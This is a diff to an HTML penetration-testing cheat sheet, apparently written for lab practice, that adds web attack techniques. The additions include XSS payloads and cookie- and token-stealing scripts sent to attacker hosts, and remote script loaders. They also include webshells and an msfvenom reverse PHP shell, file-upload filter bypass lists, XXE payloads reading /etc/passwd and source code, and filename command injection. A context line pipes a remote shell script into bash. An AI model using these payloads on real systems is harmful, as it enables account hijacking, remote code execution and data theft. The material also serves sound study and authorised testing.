@@ -194,23 +194,63 @@ USER)(description=a* #Check if the first letter of description field starts with
                                 <li> <a class="notion-link" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#other-useful-attributes"> XSS Cheatsheet</a> <br> </li>
                                 <li> <a class="notion-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md"> Payload all the things</a></li>
                             </ul>
+
+                            <p>Types of XSS</p>
+                            <ul>
+                                <li><b>Stored XSS</b>: The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)</li>
+                                <li><b>Reflected XSS</b>:Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)</li>
+                                <li><b>DOM-based XSS</b>:Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server </li>
+                            </ul>
                             
                             <h3>Common payloads</h3>
                             <pre><code class="language-js">&lt;script&gt; alert('') &lt;/script&gt;</code></pre>
                             <pre><code class="language-js">&lt;img src =q onerror=alert()&gt;</code></pre>
                             <pre><code class="language-js">&lt;link&gt; rel="stylesheet" href="javascript:alert('');"&gt;</code></pre>
+                            <p>Some webs use frames to manage their forms. Showing windows origin we will discover the real address of the site</p>
+                            <pre><code class="language-js">&lt;script&gt; console.log(window.origin) &lt;/script&gt;</code></pre>
+                            <p>Even in case a web is blocking some key words </p>
+                            <pre><code class="language-js">&lt;script&gt; print() &lt;/script&gt;</code></pre>
+                            <br>
+                            <b>In case any of these payloads are working you can try with more advanced ones in the following <a class="notion-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-htmlapplications">link</a> </b>
+
+                            <h3>Automating XSS detection</h3>
+                            <ul>
+                                <p>You can use tools like xsstrike in order to find xss in certain website <b>Important to pass the parameter</b></p>
+                                <pre><code class="language-js">python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" </code></pre>
+                                
+                            </ul>
 
                             <h3>Cookie harvesting</h3>
+                            <ul>
                             <p>Once you have identified an XSS attempt to capture cookies</p>
                             <pre><code class="language-js">&lt;img src="1" onerror=fetch("http://10.10.14.22:8082/"%2Bdocument.cookie)&gt;</code></pre>
+
+                            <p>Some killer payloads</p>
+                            <pre><code class="language-js">'&gt;&lt;script src=http://OUR_IP&gt;&lt;/script&gt;    
+"&gt;&lt;script src=http://OUR_IP&gt;&lt;/script&gt;    
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+&lt;script&gt;function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();&lt;/script&gt;     
+&lt;script&gt;$.getScript("http://OUR_IP")&lt;/script&gt;    </code></pre>    
+
+                            <p>Other data grabbing payloads</p>
+                            <pre><code class="language-js">&lt;script&gt;document.location='http://localhost/XSS/grabber.php?c='+document.cookie&lt;/script&gt;
+&lt;script&gt;document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')&lt;/script&gt;
+&lt;script&gt;new Image().src="http://localhost/cookie.php?c="+document.cookie;&lt;/script&gt;
+&lt;script&gt;new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');&lt;/script&gt;</code></pre>
+                            </ul>    
                             
                             
                             <h3>Situations</h3>
-                            
+                            <ul>
+                            <h4>Adding parameter</h4>
+                            <ul>
                             In case you find that parameters are passed through the URL you can try adding a new parameter and injecting the code there since it is not sanitized. 
                             Here what has been done is to close the select and inject the code there.
                             <pre><code class="language-js">https://URL.com/product?productId=2&storeId=&lt;/select&gt;&lt;svg onload=alert(1)&gt;</code></pre>
-
+                            </ul>
+                            
+                            <h4>Cookie harvesting</h4>
+                            <ul>
                             <p>In case you find out that XSS stored is available in a website you can run the following code in order to capture diferent parameters from the user who visit the affected website. Capture it using a python server</p>
                             <pre><code class="language-js">&lt;script&gt;
         // Crear un objeto XMLHttpRequest para enviar la información al servidor
@@ -241,9 +281,13 @@ USER)(description=a* #Check if the first letter of description field starts with
         xhr.send();
     &lt;/script&gt;
     </code></pre>
+    </ul>
 
-                            <p> Avoiding WAF</p>
+                        <h4> Avoiding WAF</h4>
+                        <ul>
                             In other situations where the WAF blocks most of the tags, a brute force attack can be carried out to try the tags that are allowed. In the links above you will find a list of tags and attributes.
+                        </ul>    
+                        </ul>
                         </ul>
                         <h2 id="Command Injection">Command Injection</h2>
                         <ul>
@@ -318,12 +362,163 @@ os.system("curl http://10.10.14.17:8000/shell.sh | bash")
                                 <pre><code class="language-php">echo 'GIF8&lt;?php system($_GET["cmd"]); ?&gt;' > shell.gif</code></pre>
                                 <p>Creation of a malicious ZIP file. The resultant file is the shell.jpg</p>
                                 <pre><code class="language-php">echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php && zip shell.jpg shell.php</code></pre>
+                                <p>Even with msfvenom we are able to create webshells</p>
+                                <pre><code class="language-php">msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php</code></pre>
+                               
                                 <p>Then we can execute it using zip://./profile_images/shell.jpg#shell.php&cmd=ids</p>
                                 <h3>Laudanum</h3>
                                 <ul>
                                     <p>Sometimes it is useful to upload Laudanum shells located at <b>/usr/share/laudanum or /usr/share/antak</b>. Examples of file <b>asp  aspx  cfm  helpers  jsp  php  wordpress</b></p>
                                     <p>Remeber to include your IP in the shell if not you won't be able to use it</p>
                                 </ul>
+
+                                <h3>Bypassing common filters</h3>
+                                <ul>
+                                    <p>In case the validations are in the client side we cant delete them by simply using the developer tools in any browser. Instead if validations are in server side we'll need to find other techniques</p>
+                                    <h4>File extensions White/Blacklist</h4>
+                                    <ul>
+                                        <p>In this case we found that in the server side there is a blacklist of <b>denied extensions</b>. Follow the steps to pwn</p>
+                                        <p>Intercept the request where you get the result of "Invalid extension type" or similar</p>
+                                        <p>Perform a bruteforce over the extension using the following wordlist<b>(usr/share/wordlist/seclist/Discovery/Web-Content/web-extensions.txt)</b>, in case you coudn't find any valid extension types try with <b>web-extensions-big.txt</b> you can do it though burp or caido</p>
+                                        <p>Once you identified which extensions are available to use create a simple code to check which extensions really execute the code (Discard the ones who only show the code itself)</p>
+                                        <pre><code class="language-php">&lt;?php echo "hola" ?&gt;</code></pre>
+                                        <p>Now that you have identified the correct extension type just upload the webshell and enjoy</p>
+                                        <p>Here comes a list of several php extensions that are likely to run php code. <b>Very useful when analizing fuzzing results of web-extensions-big.txt</b></p>
+                                        <pre><code class="language-php">.jpeg.php
+.jpg.php
+.png.php
+.php
+.php3
+.php4
+.php5
+.php7
+.php8
+.pht
+.phar
+.phpt
+.pgif
+.phtml
+.phtm
+.php%00.gif
+.php\x00.gif
+.php%00.png
+.php\x00.png
+.php%00.jpg
+.php\x00.jpg
+.inc</code></pre>
+                                    </ul>
+                                    
+                                    <h4>MIME-Type</h4>
+                                    <ul>
+                                        <p>In some ocasions the content of the file will be reviewed in order to know if a file is valid or not. This is usually done by inspecting the first few bytes of the file's content, which contain the File Signature or Magic Bytes</p>
+                                        <p>We can take advantage of it by inserting some magic bytes and the begining of the file. For example in order to bypass it type the following bytes to make a file look like a gif</p>
+                                        <pre><code class="language-php">GIF8</code></pre>
+                                        <p>List of magic bytes, very useful for bypassing content type controls</p>
+                                        <pre><code class="language-bash">#Image files
+‰PNG\r\n\x1A\n
+GIF87a #GIF
+GIF89a #GIF
+ÿØÿ  #JPEG
+BM #BMP
+RIFF....WEBP #WEBP
+
+#Languages
+&lt;?php #PHP
+&lt;?xml #XML
+&lt;?xml #XML
+&lt;svg #SVG
+
+#Documents
+%PDF #PDF
+PK #ZIP
+Rar!... #RAR
+
+#Binaries
+EXE #MZ
+.ELF #ELF</code></pre>
+                                    </ul>   
+
+                                    <h4>Reverse double injection</h4>
+                                    <ul>
+                                        <p>In some ocasions the webserver may be configured unproperly and we can abuse it using the following (All these types are included in web-extensions-big.txt) </p>
+                                        <pre><code class="language-php">shell.php.jpg</code></pre>
+                                    </ul>
+
+                                    <h4>Character injection</h4>
+                                    <ul>
+                                        <p>There are some chars that we can use to inject several characters before or after the final extension to cause the web application to misinterpret the filename and execute the uploaded file as a PHP script.</p>
+                                        <pre><code class="language-php">%20 #URL encoding (space)
+%0a #URL encoding line feed
+%00 #Null byte bypassing extension validation, cut stringsm truncate paths
+%0d0a  %0d0a  #Line feed HTTP  (shell.php%00.jpg)
+/ #Path traversal
+.\  #Relative paths
+. #Simple dot
+… #Unicode char simple bypass
+: #Injecting color before the allowed extension (shell.php:.jpg)</code></pre>
+                                    </ul>
+                                </ul>
+
+                                <h3>Limited file extensions</h3>
+                                <ul>
+                                <p>You may find that it is possible that a website only let us upload certain file types and this is not possible to bypass. In this case normally these files would iclude SVG, HTML, XML, and even some image and document files. Here are some examples of how to perform the file upload even with this restrictions</p>
+                                <h4>Uploading HTML files</h4>
+                                <ul>
+                                    <p> Although HTML files can't execute code we are able to insert JS code inside performing some XSS attack</p>
+                                </ul>    
+                                <h4>Injecting in image Metadata</h4>
+                                <ul>
+                                    <p>In case the website you are targeting is able to display image metadata you could be able to insert js code inside image metadata and then upload it to the server</p>
+                                <pre><code class="language-bash">exiftool -Comment=' "&gt;&lt;img src=1 onerror=alert(window.origin)&gt;' HTB.jpg               
+#Now checking for image metadata
+exiftool HTB.jpg 
+Comment:  "&gt;&lt;img src=1 onerror=alert(window.origin)&gt;</code></pre>
+                                </ul>
+
+                                <h4>Injecting in svg images</h4>
+                                <ul>
+                                    
+                                <p>XSS attacks can also be carried with SVG images, along with several other attacks. Scalable Vector Graphics (SVG) images are XML-based, and they describe 2D vector graphics, which the browser renders into an image</p>
+                                <p>Example of an .svg file where an alert will be carried out. This example can be used for cookie harvesting as well</p>    
+                                <pre><code class="language-html">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1"&gt;
+    &lt;rect x="1" y="1" width="1" height="1" fill="green" stroke="black" /&gt;
+    &lt;script type="text/javascript"&gt;alert(window.origin);&lt;/script&gt;
+&lt;/svg></code></pre>       
+                                <p>Other malicious attack using can be carried out. With SVG images, we can also include malicious XML data to leak the source code of the web application, and other internal documents within the server</p>    
+                                <b style="color: red;">The result of these attacks will be loaded in the same page where the file is used. Don't attempt to locate the file inside the upload directory and execute it from there because it will not work</b>
+                                <pre><code class="language-html">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
+&lt;svg&gt;&xxe;&lt/svg&gt;</code></pre>    
+                                
+<p>Even we can use built in php wrappers to convert content of files in base64 which will not be executed in the website and we would be able to read it</p>
+
+<pre><code class="language-html">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt; ]&gt;
+&lt;svg&gt;&xxe;&lt;/svg&gt;</code></pre>
+                                </ul>
+
+                                <h4>Injecting through filename</h4>
+                                <ul>
+                                    <p>For example if we introduce certain characthers in the filename, and then the web application attempts to move the uploaded file with an OS command (e.g. mv file /tmp), then our file name would inject the whoami command, which would get executed, leading to remote code execution.</p>
+                                    <pre><code class="language-bash">file.jpg||whoami
+file$(whoami).jpg
+file`whoami`.jpg</code></pre>
+                                </ul>
+
+                                <h4>Windows specific attacks</h4>
+                                <ul>
+                                    <p>One such attack is using reserved characters, such as <b>(|, <, >, *, or ?)</b>, which are usually reserved for special uses like wildcards</p>
+                                    <p>Windows reserved names for the uploaded file name, like <b>(CON, COM1, LPT1, or NUL)</b>, which may also cause an error as the web application will not be allowed to write a file with this name.</p>
+                                    <p>We can also use the <b>8.3 Filename Convention</b></p>
+                                    <ul>
+                                        <p>For example, to refer to a file called <b>(hackthebox.txt)</b> we can use <b>(HAC~1.TXT)</b> or <b>(HAC~2.TXT)</b>, where the digit represents the order of the matching files that start with <b>(HAC)</b>.</p>
+                                        <p>As Windows still supports this convention, we can write a file called <b>(e.g. WEB~1.CON)</b> to overwrite the <b>web.conf</b> This attack can lead to several outcomes, like causing information disclosure through errors, causing a DoS on the back-end server, or even accessing private files.</p>
+                                    </ul>
+                                </ul>
+
+                                </ul>    
                             </ul>
                             
                             <h2 id="Log Poisoning">Log Poisoning</h2>
